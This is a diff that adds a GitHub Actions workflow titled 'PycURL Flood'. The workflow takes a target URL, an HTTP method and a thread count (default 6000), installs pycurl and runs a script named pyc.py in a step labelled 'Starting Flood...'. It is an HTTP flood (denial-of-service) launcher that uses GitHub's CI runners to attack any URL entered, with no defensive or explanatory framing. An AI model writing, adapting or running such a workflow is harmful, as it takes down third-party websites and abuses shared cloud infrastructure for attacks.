@@ -1,0 +1,35 @@
+name: PycURL Flood
+
+on:
+  workflow_dispatch:
+    inputs:
+      urltgt:
+        description: "URL Target"
+        required: true
+        default: "http://"
+      mtd:
+        description: "Methods (GET/POST/HEAD)"
+        required: true
+        default: "GET"
+      thread:
+        description: "Threads"
+        required: true
+        default: "6000"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+    - name: Set up Python 3.9
+      uses: actions/setup-python@v2
+      with:
+        python-version: 3.9
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install pycurl
+        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+    - name: Starting Flood...
+      run: |
+        python pyc.py ${{ github.event.inputs.urltgt }} ${{ github.event.inputs.mtd }} ${{ github.event.inputs.thread }}
